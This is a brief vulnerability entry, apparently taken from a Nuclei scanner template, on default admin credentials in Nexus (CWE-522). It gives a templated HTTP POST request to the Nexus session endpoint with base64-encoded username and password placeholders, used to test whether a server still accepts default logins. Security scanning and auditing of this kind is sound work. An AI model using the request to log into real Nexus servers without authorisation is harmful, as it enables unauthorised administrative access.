# Vulnerability: Nexus Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`nexus-default-login.yaml`)

## Description
Nexus default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /service/rapture/session HTTP/1.1
Host: {{Hostname}}
X-Nexus-UI: true
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

username={{base64(username)}}&password={{base64(password)}}
```

